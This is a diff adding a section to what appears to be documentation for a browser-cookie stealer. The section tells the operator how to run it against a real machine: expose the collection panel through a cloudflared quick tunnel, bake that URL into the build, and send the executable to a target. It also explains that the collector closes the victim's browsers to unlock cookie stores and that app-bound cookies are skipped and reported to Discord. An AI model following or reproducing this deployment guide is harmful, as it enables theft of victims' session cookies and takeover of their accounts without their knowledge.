@@ -219,3 +219,30 @@ chrome.exe --disable-features=AppBoundEncryption --user-data-dir="%TEMP%\rose-te
 ```
 
 That profile writes v10 values, which the collector reads normally.
+## Running the drop against a real machine
+
+The panel has to be reachable from the target, so `127.0.0.1` is out. Quickest
+public door, no account needed:
+
+```
+cloudflared tunnel --url http://127.0.0.1:8090
+```
+
+It prints an `https://<random>.trycloudflare.com` URL. Paste that into the app
+under **Account -> Panel URL**, rebuild, and send the exe. Codes and hashes are
+baked in at build time, so a rebuild is required after any change.
+
+Two behaviours worth knowing before you send it:
+
+- **The collector closes browsers.** Current Chromium opens its cookie database
+  exclusively - no share mode gets through while it runs. The collector tries a
+  read first, and only if a store is locked does it close the browsers, wait for
+  the handles to drop, and read again. The target sees their browser close.
+- **v20 cookies are counted, not captured.** A login made on Chromium 127+ is
+  app-bound and unreachable without the elevation service. Those rows are
+  skipped and the count comes through as `skipped`, shown on the capture page
+  and in the Discord note, so an empty capture says why.
+
+A quick tunnel dies when `cloudflared` stops and the URL changes on every
+restart. For a link that survives a reboot, run a named tunnel with a Cloudflare
+account or put the panel on a real host.
